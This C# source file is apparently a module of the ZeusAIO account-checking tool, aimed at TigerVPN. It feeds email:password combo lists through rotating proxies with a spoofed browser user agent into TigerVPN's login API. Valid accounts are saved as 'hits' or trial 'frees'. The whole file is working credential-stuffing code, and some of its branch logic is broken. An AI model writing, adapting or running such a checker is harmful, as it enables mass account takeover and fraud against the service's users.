using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace TigerVpn
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = true;
                        string str = "email=" + s[0] + "&password=" + s[1];
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                      new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://www.tigervpn.com/api/v3/auth/login.json", str, "application/x-www-form-urlencoded").ToString();
                        bool flag12 = text2.Contains("status\":\"success");
                        if (flag12)
                        {
                           ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - TIGERVPN] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Tigervpn_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                        else
                        {
                            bool flag9 = text2.Contains("");
                            if (flag9)
                            {
                                // Bad
                                break;
                            }
                            else
                            {
                                bool flag11 = text2.Contains("429 Too Many Requests");
                                if (flag11)
                                {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE] - TIGERVPN] " + s[0] + ":" + s[1], Color.OrangeRed);
                                        }
                                        Export.AsResult("/Tigervpn_frees", s[0] + ":" + s[1]);
                                        return false;
                                    }
                                else
                                {
                                    bool flag33 = text2.Contains("vpn_enabled\":false");
                                    if (flag33)
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        break;
                                    }
                                    else if (text2.Contains("is_trial\":true"))
                                    {
                                            ZeusAIO.mainmenu.frees++;
                                            if (Config.config.LogorCui == "2")
                                            {
                                                Console.WriteLine("[FREE] - TIGERVPN] " + s[0] + ":" + s[1], Color.OrangeRed);
                                            }
                                            Export.AsResult("/Tigervpn_frees", s[0] + ":" + s[1]);
                                            return false;
                                        }
                                    else
                                        {
                                            ZeusAIO.mainmenu.errors++;
                                            goto Retry;
                                        }
                                }
                            }
                        }
                    }
                    //break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
    }
}

       
